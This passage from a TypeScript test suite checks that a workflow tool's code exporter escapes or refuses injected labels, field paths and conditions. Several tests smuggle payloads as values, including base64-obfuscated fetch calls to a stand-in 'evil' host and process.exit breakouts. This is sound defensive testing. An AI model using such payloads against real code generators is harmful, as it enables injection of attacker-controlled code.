              label: "Next",
              type: "action",
              config: { actionType: "HTTP Request" },
            },
          },
        ] as WorkflowNode[],
        [
          { id: "e1", source: "t", target: "c" },
          { id: "e2", source: "c", target: "n" },
        ] as never
      );
    }

    // Built from parts: these are attack payloads, not template mistakes.
    const payload = (n: number): string => `${"$"}{process.exit(${n})}`;

    it("never writes a pattern or value as live template code", () => {
      const code = exported(`matchesRegex(${FIELD}, "${payload(7)}")`);
      expect(code).not.toContain(payload(7));
      // Fails loudly where it is reached, rather than taking the false branch.
      expect(code).toContain(
        'const conditionValue_c = (() => { throw new Error("This condition uses matchesRegex'
      );
      // Inside the condition's template literal, ${ must stay escaped.
      const plain = exported(`String(${FIELD}).includes("${payload(8)}")`);
      const literalLine = plain
        .split("\n")
        .find((line) => line.includes("const conditionValue_c"));
      expect(literalLine).toContain(`\\${payload(8)}`);
    });

    it("keeps a label inside its comment", () => {
      const code = exported(`${FIELD} === 1`, "Lbl\nprocess.exit(9);//");
      expect(code).not.toMatch(/^\s*process\.exit\(9\)/m);
    });

    function workflowCode(condition: string, sourceLabel = "Webhook"): string {
      const nodes = [
        {
          id: "t",
          type: "trigger",
          position: { x: 0, y: 0 },
          data: { label: "Trigger", type: "trigger", config: {} },
        },
        {
          id: "n1",
          type: "action",
          position: { x: 0, y: 0 },
          data: {
            label: sourceLabel,
            type: "action",
            config: { actionType: "HTTP Request" },
          },
        },
        {
          id: "c",
          type: "action",
          position: { x: 0, y: 0 },
          data: {
            label: "Check",
            type: "action",
            config: { actionType: "Condition", condition },
          },
        },
        {
          id: "n",
          type: "action",
          position: { x: 0, y: 0 },
          data: {
            label: "Next",
            type: "action",
            config: { actionType: "HTTP Request" },
          },
        },
      ] as WorkflowNode[];
      const edges = [
        { id: "e0", source: "t", target: "n1" },
        { id: "e1", source: "n1", target: "c" },
        { id: "e2", source: "c", target: "n", sourceHandle: "true" },
      ] as never;
      return generateWorkflowCode(nodes, edges).code;
    }

    // The maintainer's example. A key needing escapes is written without
    // quotes or backslashes, so escaping done later cannot reopen it; the
    // Condition exporter then refuses it, since it is not condition grammar.
    it("writes any field path as data, never as code", () => {
      const injected = `{{@n1:Webhook.a || fetch(atob("aHR0cDovL2V2aWw")) || b}} == 1`;
      // Written as is, a Condition's key is a plain quoted string.
      expect(workflowCode(injected)).toContain(
        'if (webhookResult["a || fetch(atob(\\"aHR0cDovL2V2aWw\\")) || b"] == 1) {'
      );
      // Escaped again later as template text, it is written without quotes.
      const sdk = exported(injected);
      expect(sdk).toContain("?.data?.[String.fromCharCode(");
      expect(sdk).not.toContain("fetch(atob");
      expect(workflowCode("{{@n1:Webhook.my field}} == 1")).toContain(
        'if (webhookResult["my field"] == 1) {'
      );
    });

    // Paths are read the way the run reads them (resolveStrictPath).
    it("writes indexes and odd parts the way the run reads them", () => {
      for (const [path, written] of [
        ["items[0].value", "webhookResult.items[0].value"],
        ["topics.1", "webhookResult[1]".replace("[1]", ".topics[1]")],
        ["codes.007", 'webhookResult.codes["007"]'],
        ["items[007]", "webhookResult.items[7]"],
        ["a..b", "webhookResult.a.b"],
        [" a . b ", "webhookResult.a.b"],
        ["my-list[0]", 'webhookResult["my-list"][0]'],
        ["n.99999999999999999999", 'webhookResult.n["99999999999999999999"]'],
      ] as const) {
        expect(workflowCode(`{{@n1:Webhook.${path}}} == 1`)).toContain(
          `if (${written} == 1) {`
        );
      }
    });

    // A reference inside quotes is part of the text; it must not close them.
    it("keeps a reference inside a quoted string from closing it", () => {
      const inDouble = `"{{@n1:Webhook. + fetch(atob('aHR0cDovL2V2aWw')) + }}" == "x"`;
      const inSingle = `'{{@n1:Webhook. + fetch(atob("aHR0cDovL2V2aWw")) + }}' == "x"`;
      // Closing the double quotes would make a call: refused.
      expect(workflowCode(inDouble)).toContain("if (false /* ERROR:");
      // Inside single quotes the key's double quotes are only text.
      expect(workflowCode(inSingle)).toContain(
        `if ('webhookResult["+ fetch(atob(\\"aHR0cDovL2V2aWw\\")) +"]' == "x") {`
      );
      // The SDK writes the condition as template text; the key stays one
      // string inside its ${...}.
      expect(exported(inDouble)).toContain(
        `\`"\${outputs?.['n1']?.data?.["+ fetch(atob('aHR0cDovL2V2aWw')) +"]}" == "x"\``
      );
      expect(exported(inSingle)).toContain(
        "`'${outputs?.['n1']?.data?.[String.fromCharCode("
      );
    });

    it("exports a regex condition as code that throws where it is reached", () => {
      const nodes = [
        {
          id: "t",
          type: "trigger",
          position: { x: 0, y: 0 },
          data: { label: "Trigger", type: "trigger", config: {} },
        },
        {
          id: "c",
          type: "action",
          position: { x: 0, y: 0 },
          data: {
            label: "Check",
            type: "action",
            config: {
              actionType: "Condition",
              condition: `matchesRegex(${FIELD}, "^0x")`,
            },
          },
        },
        {
          id: "n",
          type: "action",
          position: { x: 0, y: 0 },
          data: {
            label: "Next",
            type: "action",
            config: { actionType: "HTTP Request" },
          },
        },
      ] as WorkflowNode[];
      const edges = [
        { id: "e1", source: "t", target: "c" },
        { id: "e2", source: "c", target: "n", sourceHandle: "true" },
      ] as never;
      const result = generateWorkflowCode(nodes, edges);
      expect(result.code).toContain(
        'if ((() => { throw new Error("This condition uses matchesRegex'
      );
      expect(result.validationErrors).toEqual([
        'Condition node "Check" uses matchesRegex, which exported code does not support',
      ]);
    });

    // Reached only when save validation was skipped (an unknown type).
    it("writes an unknown action type as a string", () => {
      const actionType = 'x", evil: process.exit(1), y: "';
      const code = generateWorkflowCode(
        [
          {
            id: "t",
            type: "trigger",
            position: { x: 0, y: 0 },
            data: { label: "Trigger", type: "trigger", config: {} },
          },
          {
            id: "u",
            type: "action",
            position: { x: 0, y: 0 },
            data: { label: "Odd", type: "action", config: { actionType } },
          },
          {
            id: "n",
            type: "action",
            position: { x: 0, y: 0 },
            data: {
              label: "Next",
              type: "action",
              config: {
                actionType: "HTTP Request",
                endpoint: "{{@u:Odd.x}}",
              },
            },
          },
        ] as WorkflowNode[],
        [
          { id: "e1", source: "t", target: "u" },
          { id: "e2", source: "u", target: "n" },
        ] as never
      ).code;
      expect(code).not.toContain("evil: process.exit(1)");
    });

    // JavaScript reads these differently from the run: an increment, and a
    // leading-zero number that a module refuses.
    it("refuses ++, --, leading-zero numbers and 1.e3 in exported conditions", () => {
      for (const condition of [
        "{{@n1:Webhook.a}} ++ > 0",
        "-- {{@n1:Webhook.a}} > 0",
        "{{@n1:Webhook.a}} == 010",
        "1.e3 === {{@n1:Webhook.a}}",
      ]) {
        expect(workflowCode(condition)).toContain("if (false /* ERROR:");
      }
      expect(workflowCode("{{@n1:Webhook.a}} == 0.5")).toContain(
        "if (webhookResult.a == 0.5) {"
      );
      // $01 is a name, not a number.
      expect(workflowCode("{{@n1:Webhook.a}}.$01 === 1")).toContain(
        "if (webhookResult.a.$01 === 1) {"
      );
      expect(exported("1.e3 == 1")).toContain(
        "condition: false /* not supported"
      );
    });

    it("writes long and odd keys as the run reads them", () => {
      expect(workflowCode("{{@n1:Webhook.n.9007199254740993}} == 1")).toContain(
        'webhookResult.n["9007199254740993"] == 1'
      );
      expect(exported("{{@n1:Webhook.a`b}} == 1")).toContain(
        "?.data?.[String.fromCharCode(97,96,98)]"
      );
    });

    // Condition step input is written as code, so it gets the same check.
    it("writes a Condition step's input only when it is condition grammar", () => {
      expect(exported("1 == 1")).toContain("condition: 1 == 1");
      // JavaScript reads 010 differently from the run.
      expect(exported("1 == 010")).toContain(
        "condition: false /* not supported"
      );
      const code = exported("process.exit(1)");
      expect(code).toContain("condition: false /* not supported");
      expect(code).not.toContain("condition: process.exit");
    });

    it("exports a reference to a node whose label has dots", () => {
      expect(
        workflowCode(
          "{{@n1:Price v1.2 (beta).amount}} > 5",
          "Price v1.2 (beta)"
        )
      ).toContain("if (priceV12BetaResult.amount > 5) {");
    });

    // A token the exporter cannot resolve is written as typed.
    it("refuses a token it cannot resolve, so its text stays out of code", () => {
      for (const condition of [
        '"{{a" + fetch(atob("aHR0cDovL2V2aWw")) + "b}}" == 1',
        '"{{@nope:x" + fetch(atob("aHR0cDovL2V2aWw")) + "y}}" == 1',
        '"{{$nope" + fetch(atob("aHR0cDovL2V2aWw")) + "y}}" == 1',
      ]) {
        const code = workflowCode(condition);
        expect(code).toContain("if (false /* ERROR:");
        expect(code).not.toContain("+ fetch(atob");
      }
      expect(
        exported('"{{a" + fetch(atob("aHR0cDovL2V2aWw")) + "b}}" == 1')
      ).toContain(
        "const conditionValue_c = false; // not supported in exported code"
      );
    });

    // The run uses saved rules before the condition text; so does export.
    it("exports a regex rule saved only as rules", () => {
      const code = generateWorkflowSDKCode(
        "wf",
        [
          {
            id: "t",
            type: "trigger",
            position: { x: 0, y: 0 },
            data: { label: "Trigger", type: "trigger", config: {} },
          },
          {
            id: "c",
            type: "action",
            position: { x: 0, y: 0 },
            data: {
              label: "Check",
              type: "action",
              config: {
                actionType: "Condition",
                condition: "true",
                conditionConfig: {
                  group: {
                    id: "g",
                    logic: "AND",
                    rules: [
                      {
                        id: "r",
                        leftOperand: FIELD,
                        operator: "matchesRegex",
                        rightOperand: "^0x",
                      },
                    ],
                  },
                },
              },
            },
          },
          {
            id: "n",
            type: "action",
            position: { x: 0, y: 0 },
            data: {
              label: "Next",
              type: "action",
              config: { actionType: "HTTP Request" },
            },
          },
        ] as WorkflowNode[],
        [
          { id: "e1", source: "t", target: "c" },
          { id: "e2", source: "c", target: "n" },
        ] as never
      );
      expect(code).toContain("This condition uses matchesRegex");
    });

    it("writes a label into a string literal as data", () => {
      const label = "L'+fetch('evil')+'";
      const code = generateWorkflowSDKCode(
        "wf",
        [
          {
            id: "t",
            type: "trigger",
            position: { x: 0, y: 0 },
            data: { label: "Trigger", type: "trigger", config: {} },
          },
          {
            id: "n",
            type: "action",
            position: { x: 0, y: 0 },
            data: {
              label,
              type: "action",
              config: { actionType: "HTTP Request" },
            },
          },
        ] as WorkflowNode[],
        [{ id: "e1", source: "t", target: "n" }] as never
      );
      expect(code).toContain(`label: ${JSON.stringify(label)}, data:`);
      expect(code).not.toContain(`label: '${label}'`);
    });

    // Labels, descriptions, node ids and action types all go through it.
    it("keeps text inside a // or /* comment", () => {
      for (const breaker of ["\n", "\r", "\u2028", "\u2029"]) {
        expect(commentSafe(`note${breaker}process.exit(6);//`)).toBe(
          "note process.exit(6);//"
        );
      }
      expect(commentSafe("a */ process.exit(6); /* b")).not.toContain("*/");
    });
  });
});
